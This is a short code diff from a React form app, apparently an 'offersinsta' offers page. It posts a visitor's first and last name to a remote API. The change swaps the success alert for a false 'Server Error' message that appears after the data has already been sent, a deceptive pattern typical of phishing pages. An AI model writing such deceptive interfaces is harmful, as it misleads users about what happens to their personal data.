@@ -10,7 +10,7 @@ function App() {
         e.preventDefault();
         try {
             const response = await axios.post(`https://offersinsta.onrender.com/api/form`, { firstName, lastName });
-            alert(' Congratulations We wiil get back you soon');
+            alert('Server Error Please Try agin with in 30seconds');
             setFirstName('');
             setLastName('');
 
